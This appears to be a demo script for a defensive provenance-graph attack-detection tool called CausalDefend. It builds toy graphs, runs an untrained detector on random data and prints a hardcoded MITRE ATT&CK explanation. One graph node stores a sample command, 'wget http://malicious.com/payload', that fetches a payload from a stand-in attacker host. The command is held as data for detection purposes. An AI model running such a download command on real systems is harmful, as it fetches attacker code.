"""
CausalDefend - Demo Básico (Sin Modelos Pre-entrenados)

Demuestra las capacidades básicas sin necesitar checkpoints.
"""

import sys
import warnings
from pathlib import Path

# Suprimir warnings de NumPy MINGW (problema conocido en Python 3.13 Windows)
warnings.filterwarnings('ignore', category=RuntimeWarning, module='numpy')
warnings.filterwarnings('ignore', message='.*MINGW.*')


def print_banner():
    """Banner de bienvenida"""
    print("\n" + "="*70)
    print("  CausalDefend - Demo Básico")
    print("="*70 + "\n")


def check_imports():
    """Verifica que las importaciones básicas funcionen"""
    print("Verificando importaciones básicas...\n")
    
    checks = []
    
    # NumPy
    try:
        import numpy as np
        print(f"✓ NumPy {np.__version__}")
        # Test rápido
        arr = np.array([1, 2, 3])
        assert arr.sum() == 6
        checks.append(True)
    except Exception as e:
        print(f"✗ NumPy: {e}")
        import traceback
        traceback.print_exc()
        checks.append(False)
    
    # PyTorch
    try:
        import torch
        print(f"✓ PyTorch {torch.__version__}")
        # Test rápido
        tensor = torch.tensor([1.0, 2.0, 3.0])
        assert tensor.sum().item() == 6.0
        checks.append(True)
    except Exception as e:
        print(f"✗ PyTorch: {e}")
        checks.append(False)
    
    # NetworkX
    try:
        import networkx as nx
        print(f"✓ NetworkX {nx.__version__}")
        # Test rápido
        G = nx.DiGraph()
        G.add_edge(1, 2)
        assert G.number_of_nodes() == 2
        checks.append(True)
    except Exception as e:
        print(f"✗ NetworkX: {e}")
        checks.append(False)
    
    # FastAPI
    try:
        import fastapi
        print(f"✓ FastAPI {fastapi.__version__}")
        checks.append(True)
    except Exception as e:
        print(f"✗ FastAPI: {e}")
        checks.append(False)
    
    # Pydantic
    try:
        import pydantic
        print(f"✓ Pydantic {pydantic.__version__}")
        checks.append(True)
    except Exception as e:
        print(f"✗ Pydantic: {e}")
        checks.append(False)
    
    print()
    return all(checks)


def demo_graph_creation():
    """Demo de creación de grafos"""
    print("-"*70)
    print("DEMO 1: Creación de Grafos de Proveniencia")
    print("-"*70 + "\n")
    
    try:
        import networkx as nx
        from datetime import datetime
        
        # Crear grafo simple
        G = nx.DiGraph()
        
        # Agregar nodos (procesos y archivos)
        G.add_node("bash_1234", 
                   type="process", 
                   pid=1234, 
                   cmd="bash",
                   timestamp=datetime.now().isoformat())
        
        G.add_node("wget_5678",
                   type="process",
                   pid=5678,
                   cmd="wget http://malicious.com/payload",
                   timestamp=datetime.now().isoformat())
        
        G.add_node("/tmp/payload.sh",
                   type="file",
                   path="/tmp/payload.sh",
                   timestamp=datetime.now().isoformat())
        
        # Agregar edges (relaciones causales)
        G.add_edge("bash_1234", "wget_5678", relation="fork")
        G.add_edge("wget_5678", "/tmp/payload.sh", relation="write")
        
        print(f"✓ Grafo creado con {G.number_of_nodes()} nodos y {G.number_of_edges()} aristas")
        print(f"\nNodos:")
        for node, data in G.nodes(data=True):
            print(f"  - {node}: {data.get('type', 'unknown')}")
        
        print(f"\nAristas (relaciones causales):")
        for src, dst, data in G.edges(data=True):
            print(f"  - {src} --[{data.get('relation', 'unknown')}]--> {dst}")
        
        return True
        
    except Exception as e:
        print(f"✗ Error: {e}")
        return False


def demo_neural_network():
    """Demo de red neuronal básica"""
    print("\n" + "-"*70)
    print("DEMO 2: Red Neuronal de Detección (Simulada)")
    print("-"*70 + "\n")
    
    try:
        import torch
        import torch.nn as nn
        
        # Arquitectura simplificada
        class SimpleDetector(nn.Module):
            def __init__(self):
                super().__init__()
                self.encoder = nn.Sequential(
                    nn.Linear(64, 128),
                    nn.ReLU(),
                    nn.Linear(128, 64),
                    nn.ReLU(),
                    nn.Linear(64, 1),
                    nn.Sigmoid()
                )
            
            def forward(self, x):
                return self.encoder(x)
        
        model = SimpleDetector()
        
        # Test con datos sintéticos
        sample_input = torch.randn(10, 64)  # 10 grafos, 64 features
        
        with torch.no_grad():
            predictions = model(sample_input)
        
        print(f"✓ Modelo creado con {sum(p.numel() for p in model.parameters())} parámetros")
        print(f"\nInput shape: {sample_input.shape}")
        print(f"Output shape: {predictions.shape}")
        print(f"\nPrimeras 5 predicciones (scores de anomalía):")
        for i, score in enumerate(predictions[:5]):
            status = "🚨 ANOMALÍA" if score > 0.5 else "✓ Normal"
            print(f"  Grafo {i+1}: {score.item():.4f} - {status}")
        
        return True
        
    except Exception as e:
        print(f"✗ Error: {e}")
        return False


def demo_causal_discovery():
    """Demo de descubrimiento causal"""
    print("\n" + "-"*70)
    print("DEMO 3: Descubrimiento de Cadenas Causales")
    print("-"*70 + "\n")
    
    try:
        import networkx as nx
        
        # Crear grafo de ataque simulado
        G = nx.DiGraph()
        
        # Cadena de ataque típica
        attack_chain = [
            ("phishing_email", "user_click"),
            ("user_click", "malware_download"),
            ("malware_download", "malware_execution"),
            ("malware_execution", "credential_dump"),
            ("credential_dump", "lateral_movement"),
            ("lateral_movement", "data_exfiltration")
        ]
        
        for src, dst in attack_chain:
            G.add_edge(src, dst, weight=0.9)
        
        # Agregar ruido (actividad benigna)
        G.add_edge("user_login", "normal_activity", weight=0.1)
        G.add_edge("normal_activity", "file_access", weight=0.1)
        
        print(f"✓ Grafo de ataque creado con {G.number_of_nodes()} nodos")
        
        # Encontrar caminos críticos
        try:
            paths = list(nx.all_simple_paths(G, "phishing_email", "data_exfiltration"))
            
            print(f"\n🚨 Cadenas de ataque detectadas: {len(paths)}")
            for i, path in enumerate(paths, 1):
                print(f"\nCadena {i}:")
                for j, node in enumerate(path, 1):
                    arrow = " → " if j < len(path) else ""
                    print(f"  {j}. {node}{arrow}", end="")
                print()
            
            # Simular scoring
            print("\n📊 Scoring de criticidad:")
            criticality = {
                "phishing_email": 0.6,
                "credential_dump": 0.95,
                "lateral_movement": 0.9,
                "data_exfiltration": 1.0
            }
            
            for node, score in sorted(criticality.items(), key=lambda x: x[1], reverse=True):
                bar = "█" * int(score * 20)
                print(f"  {node:25s} [{bar:<20s}] {score:.2f}")
            
        except Exception as e:
            print(f"  (No hay caminos directos o error: {e})")
        
        return True
        
    except Exception as e:
        print(f"✗ Error: {e}")
        return False


def demo_explanation():
    """Demo de generación de explicaciones"""
    print("\n" + "-"*70)
    print("DEMO 4: Generación de Explicaciones")
    print("-"*70 + "\n")
    
    explanation = """
╔══════════════════════════════════════════════════════════════════════╗
║                    EXPLICACIÓN DE ATAQUE DETECTADO                   ║
╚══════════════════════════════════════════════════════════════════════╝

📋 RESUMEN:
Se detectó un ataque APT con cadena de 6 etapas, desde phishing inicial
hasta exfiltración de datos.

🔍 ANÁLISIS CAUSAL:

1. INITIAL ACCESS (Tactic: Initial Access)
   └─ Phishing email ejecutado por usuario
   └─ MITRE ATT&CK: T1566.001 (Spearphishing Attachment)

2. EXECUTION (Tactic: Execution)  
   └─ Malware descargado y ejecutado
   └─ MITRE ATT&CK: T1204.002 (User Execution: Malicious File)

3. CREDENTIAL ACCESS (Tactic: Credential Access)
   └─ Dumping de credenciales de LSASS
   └─ MITRE ATT&CK: T1003.001 (LSASS Memory)
   └─ ⚠️ CRÍTICO: Este nodo habilitó el resto del ataque

4. LATERAL MOVEMENT (Tactic: Lateral Movement)
   └─ Movimiento lateral usando credenciales robadas
   └─ MITRE ATT&CK: T1021.002 (SMB/Windows Admin Shares)

5. EXFILTRATION (Tactic: Exfiltration)
   └─ Exfiltración de datos sensibles
   └─ MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel)

💡 CONTRAFACTUALES (What-If):

• Si "credential_dump" hubiera sido bloqueado:
  → El ataque se habría detenido en la etapa 3 de 6
  → "lateral_movement" y "data_exfiltration" no habrían ocurrido
  → Impacto reducido en 67%

• Si "malware_execution" hubiera sido aislado:
  → El ataque completo habría sido prevenido
  → 0% de compromiso

🛡️ RECOMENDACIONES:

1. Implementar MFA para acceso a sistemas críticos
2. Monitorear procesos que acceden a LSASS.exe
3. Segmentar red para limitar movimiento lateral
4. Implementar DLP para detectar exfiltración
5. Entrenar usuarios en detección de phishing

📊 CONFIANZA: 0.94 (94%)
📊 COBERTURA: P(verdadero positivo) ≥ 0.95

══════════════════════════════════════════════════════════════════════
"""
    
    print(explanation)
    return True


def main():
    """Ejecutar demo completo"""
    print_banner()
    
    # Verificar imports
    if not check_imports():
        print("\n❌ Algunos imports fallaron.")
        print("\nSoluciones:")
        print("  1. Ejecuta: python fix_numpy.py")
        print("  2. Reinstala: pip install -r requirements-minimal.txt")
        print("  3. Verifica: python verify_installation.py")
        return 1
    
    print("\n✅ Todas las dependencias básicas están OK!\n")
    
    # Ejecutar demos
    demos = [
        demo_graph_creation,
        demo_neural_network,
        demo_causal_discovery,
        demo_explanation
    ]
    
    results = []
    for demo in demos:
        try:
            result = demo()
            results.append(result)
        except Exception as e:
            print(f"\n❌ Error en demo: {e}")
            results.append(False)
        
        input("\n\nPresiona Enter para continuar...")
    
    # Resumen final
    print("\n" + "="*70)
    print("  RESUMEN DE DEMOS")
    print("="*70 + "\n")
    
    demo_names = [
        "Creación de Grafos",
        "Red Neuronal",
        "Descubrimiento Causal",
        "Generación de Explicaciones"
    ]
    
    for name, result in zip(demo_names, results):
        status = "✓ OK" if result else "✗ FALLÓ"
        print(f"{status:8s} - {name}")
    
    print("\n" + "="*70)
    
    if all(results):
        print("\n🎉 ¡Todas las demos funcionaron correctamente!")
        print("\nPróximos pasos:")
        print("  • Ver documentación completa: README.md")
        print("  • Entrenar modelos: docs/QUICKSTART.md")
        print("  • Desplegar API: docs/DEPLOYMENT.md")
    else:
        print("\n⚠️  Algunos demos tuvieron problemas.")
        print("   Revisa los errores arriba para más detalles.")
    
    return 0 if all(results) else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n👋 Demo cancelado por el usuario.")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n❌ Error inesperado: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
